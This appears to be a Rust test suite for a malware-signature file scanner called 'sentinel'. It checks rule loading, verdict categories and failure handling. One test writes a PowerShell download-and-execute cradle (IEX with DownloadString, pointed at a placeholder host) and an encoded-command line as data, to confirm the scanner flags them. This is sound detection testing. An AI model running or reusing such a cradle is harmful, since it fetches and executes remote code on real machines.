use std::fs;

use sentinel::signatures::{
    RuleCategory, RuleSetStatus, SignatureErrorKind, SignatureLimit, SignatureOutcome,
};
use sentinel::{FileOutcome, ScanStatus, Verdict, scan, scan_with_rules};

fn rule(category: &str, condition: &str) -> String {
    format!(
        r#"rule Fixture {{
        meta:
            category = "{category}"
            description = "Harmless synthetic unit test rule"
            version = "1"
            author = "Sentinel tests"
            license = "CC0-1.0"
        strings:
            $marker = "SENTINEL_FIXTURE_MARKER"
        condition: {condition}
    }}"#
    )
}

#[test]
fn bundled_marker_is_a_benign_test_match_and_normal_files_have_no_detections() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("sample");
    fs::write(&path, b"SENTINEL_TEST_SIGNATURE").unwrap();
    let report = scan(&path);
    assert_eq!(report.status, ScanStatus::Complete);
    assert_eq!(report.verdict, Verdict::TestMatch);
    assert_eq!(report.files[0].verdict, Verdict::TestMatch);
    assert_eq!(report.summary.signature_matches, 1);
    let Some(SignatureOutcome::Complete { matches }) = &report.files[0].signatures else {
        panic!("Signature scan did not complete: {report:?}");
    };
    assert_eq!(matches[0].rule_id, "Sentinel_Benign_Test");
    assert_eq!(matches[0].category, RuleCategory::Test);
    assert_eq!(matches[0].locations[0].offset, 0);
    assert_eq!(matches[0].locations[0].length, 23);
    let RuleSetStatus::Ready { info } = &report.rules else {
        panic!("Bundled rules did not load");
    };
    assert_eq!(info.rule_count, 20);
    assert_eq!(info.origin, "bundled-v3");
    assert_eq!(info.sha256.len(), 64);
    assert_eq!(info.sources.len(), 5);
    fs::write(&path, b"ordinary text").unwrap();
    let report = scan(&path);
    assert_eq!(report.verdict, Verdict::NoDetections);
    assert_eq!(report.summary.signature_scanned, 1);
    assert_eq!(report.summary.signature_matches, 0);
}

#[test]
fn bundled_powershell_heuristics_require_context_and_are_only_suspicious() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("command.txt");
    // These strings are inspected as data. No shell or network call executes them.
    for bytes in [
        &b"powershell -Command IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/test')"[..],
        &b"powershell.exe -EncodedCommand ZQBjAGgAbwAgAHQAZQBzAHQA"[..],
    ] {
        fs::write(&path, bytes).unwrap();
        let report = scan(&path);
        assert_eq!(report.status, ScanStatus::Complete);
        assert_eq!(report.verdict, Verdict::Suspicious);
    }
    for bytes in [
        &b"DownloadString is a method; Invoke-Expression is a cmdlet"[..],
        &b"powershell -Command Write-Output hello"[..],
        &b"This document describes powershell -EncodedCommand"[..],
    ] {
        fs::write(&path, bytes).unwrap();
        assert_eq!(scan(&path).verdict, Verdict::NoDetections);
    }
}

#[test]
fn custom_rules_are_identified_and_category_controls_verdict() {
    let directory = tempfile::tempdir().unwrap();
    let rules = directory.path().join("rules");
    fs::create_dir(&rules).unwrap();
    let path = directory.path().join("sample");
    fs::write(&path, b"prefix SENTINEL_FIXTURE_MARKER suffix").unwrap();
    for (category, verdict) in [
        ("test", Verdict::TestMatch),
        ("suspicious", Verdict::Suspicious),
        ("known_malicious", Verdict::KnownMaliciousMatch),
    ] {
        fs::write(rules.join("fixture.yar"), rule(category, "$marker")).unwrap();
        let report = scan_with_rules(&path, &rules);
        assert_eq!(report.status, ScanStatus::Complete);
        assert_eq!(report.verdict, verdict);
        assert_eq!(report.files[0].verdict, verdict);
        let RuleSetStatus::Ready { info } = &report.rules else {
            panic!("Rules did not load");
        };
        assert_eq!(info.origin, "local-directory");
        assert_eq!(info.sources[0].path.file_name().unwrap(), "fixture.yar");
        assert_eq!(info.sources[0].sha256.len(), 64);
    }
}

#[test]
fn missing_empty_invalid_or_incompletely_described_rules_never_look_successful() {
    let directory = tempfile::tempdir().unwrap();
    let path = directory.path().join("sample");
    fs::write(&path, b"abc").unwrap();
    let rules = directory.path().join("rules");
    let missing = scan_with_rules(&path, &rules);
    assert!(matches!(missing.rules, RuleSetStatus::Failed { .. }));
    fs::create_dir(&rules).unwrap();
    for source in [
        "",
        "rule broken {",
        "rule missing_metadata { condition: true }",
        "include \"outside.yar\"",
        "import \"pe\" rule uses_pe { condition: pe.is_pe }",
    ] {
        fs::write(rules.join("broken.yar"), source).unwrap();
        let report = scan_with_rules(&path, &rules);
        assert_eq!(report.status, ScanStatus::Partial);
        assert_eq!(report.verdict, Verdict::Error);
        assert_eq!(report.files[0].verdict, Verdict::Inconclusive);
        assert_eq!(report.summary.hashed, 1);
        assert_eq!(report.summary.signature_incomplete, 1);
        assert!(matches!(report.rules, RuleSetStatus::Failed { .. }));
        assert!(matches!(
            report.files[0].signatures,
            Some(SignatureOutcome::Failed { .. })
        ));
    }
    fs::remove_file(rules.join("broken.yar")).unwrap();
    assert!(matches!(
        scan_with_rules(&path, &rules).rules,
        RuleSetStatus::Failed { .. }
    ));
    assert_eq!(
        scan_with_rules(directory.path(), directory.path().join("missing")).verdict,
        Verdict::Error
    );
}

#[test]
fn signatures_remain_visible_when_pe_analysis_fails() {
    let directory = tempfile::tempdir().unwrap();
    let rules = directory.path().join("rules");
    fs::create_dir(&rules).unwrap();
    fs::write(rules.join("fixture.yar"), rule("suspicious", "$marker")).unwrap();
    let path = directory.path().join("bad.exe");
    fs::write(&path, b"MZ SENTINEL_FIXTURE_MARKER").unwrap();
    let report = scan_with_rules(path, &rules);
    assert_eq!(report.status, ScanStatus::Partial);
    assert_eq!(report.verdict, Verdict::Suspicious);
    assert_eq!(report.summary.hashed, 1);
    assert_eq!(report.summary.pe_incomplete, 1);
    assert_eq!(report.summary.signature_matches, 1);
}

#[test]
fn rule_source_limits_are_checked_and_file_hashing_still_works() {
    let directory = tempfile::tempdir().unwrap();
    let rules = directory.path().join("rules");
    fs::create_dir(&rules).unwrap();
    fs::write(rules.join("large.yar"), vec![b' '; 8 * 1024 * 1024 + 1]).unwrap();
    let path = directory.path().join("sample");
    fs::write(&path, b"abc").unwrap();
    let report = scan_with_rules(path, rules);
    assert_eq!(report.summary.hashed, 1);
    assert!(
        matches!(report.rules, RuleSetStatus::Failed { error } if error.kind == SignatureErrorKind::ResourceLimit)
    );
}

#[test]
fn saturated_nonmatching_patterns_are_inconclusive_not_no_detections() {
    let directory = tempfile::tempdir().unwrap();
    let rules = directory.path().join("rules");
    fs::create_dir(&rules).unwrap();
    // Requires more occurrences than the engine cap; it must not become a false negative.
    fs::write(
        rules.join("count.yar"),
        rule("known_malicious", "#marker > 4096"),
    )
    .unwrap();
    let path = directory.path().join("sample");
    fs::write(&path, b"SENTINEL_FIXTURE_MARKER".repeat(4097)).unwrap();
    let report = scan_with_rules(path, rules);
    assert_eq!(report.status, ScanStatus::Partial);
    assert_eq!(report.verdict, Verdict::Inconclusive);
    assert!(matches!(
        report.files[0].signatures,
        Some(SignatureOutcome::Skipped {
            reason: SignatureLimit::PatternMatches,
            limit: 4096
        })
    ));
}

#[test]
fn invalid_category_is_not_silently_promoted_to_malicious() {
    let directory = tempfile::tempdir().unwrap();
    let rules = directory.path().join("rules");
    fs::create_dir(&rules).unwrap();
    fs::write(rules.join("fixture.yar"), rule("typo", "$marker")).unwrap();
    let path = directory.path().join("sample");
    fs::write(&path, b"SENTINEL_FIXTURE_MARKER").unwrap();
    let report = scan_with_rules(path, rules);
    assert!(
        matches!(report.rules, RuleSetStatus::Failed { error } if error.kind == SignatureErrorKind::InvalidMetadata)
    );
}

#[test]
fn failures_and_skips_have_no_signature_findings() {
    let directory = tempfile::tempdir().unwrap();
    let report = scan(directory.path().join("missing"));
    assert_eq!(report.status, ScanStatus::Failed);
    assert_eq!(report.verdict, Verdict::Error);
    assert_eq!(report.summary.signature_scanned, 0);
    assert!(report.files.is_empty());
    // An empty ordinary file is successfully checked, not skipped.
    let path = directory.path().join("empty");
    fs::write(&path, []).unwrap();
    let report = scan(path);
    assert_eq!(report.verdict, Verdict::NoDetections);
    assert!(matches!(
        report.files[0].outcome,
        FileOutcome::Hashed { .. }
    ));
}
